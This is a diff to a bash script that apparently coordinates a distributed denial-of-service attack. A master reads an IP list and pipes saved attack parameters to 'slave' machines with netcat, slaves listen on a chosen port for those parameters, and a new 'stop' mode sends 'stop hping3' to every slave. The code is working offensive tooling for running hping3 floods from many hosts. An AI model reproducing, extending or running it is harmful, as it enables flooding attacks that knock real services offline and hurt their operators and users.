@@ -92,8 +92,7 @@ exit 0
 #No GUI, derive parameters from the history.
 if [ "$1" = "Unattended" ] || [ "$1" = "unattended" ]; then
     func_history
-fi
-if [ "$1" = "History" ] || [ "$1" = "history" ]; then
+elif [ "$1" = "History" ] || [ "$1" = "history" ]; then
     LAST_DIR=`pwd`
     cd ~/.dos_history/
     select DOS_SESSION in *; do
@@ -110,11 +109,12 @@ fi
 #7:58PM 13/01/2012
 function master {
     while read p; do
-#    Unnecessary jibber jabber until security is implemented.
-#    SLAVE_IP=`echo ${p} | awk '{printf $1}'`
-#    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
-    cat ${DOS_SESSION} | nc ${p}
-    echo "Sent attack details to host:port ${p}"
+#   Unnecessary jibber jabber until security is implemented.
+    SLAVE_IP=`echo ${p} | awk '{printf $1}'`
+    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
+# For this bit, thank Stackoverflow
+    cat ${DOS_SESSION} | nc ${SLAVE_IP} ${SLAVE_PORT}
+    echo "Sent attack details to ${SLAVE_IP} on port ${SLAVE_PORT}"
     done < .ip_list
     }
 if [ "$1" = "master" ] || [ "$1" = "Master" ]; then
@@ -126,11 +126,17 @@ if [ "$1" = "master" ] || [ "$1" = "Master" ]; then
     master
     exit 0
     done
-# For this bit, thank Stackoverflow
-
-fi
-
-if [ "$1" = "slave" ] || [ "$1" = "Slave" ]; then
+elif [ "$1" = "stop" ] || [  "$1" = "Stop" ]; then
+    echo "Make sure a third field is in ~/.dos_history/.ip_list and a daemon running on the machine."
+    cd ~/.dos_history
+    while read p; do
+    SLAVE_IP=`echo ${p} | awk '{printf $1}'`
+    SLAVE_PORT=`echo ${p} | awk '{printf $3}'`
+    echo "stop hping3" | nc ${SLAVE_IP} ${SLAVE_PORT}
+    echo "Sent stop packet to ${SLAVE_IP} on port ${SLAVE_PORT}"
+    done < .ip_list
+    exit 0
+elif [ "$1" = "slave" ] || [ "$1" = "Slave" ]; then
     PORT_NUM=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What port to listen on?" 8 40 111 --stdout`
     NETCAT=`nc -l ${PORT_NUM} > netcat.temp`
     DOS_HISTORY_FILE=netcat.temp
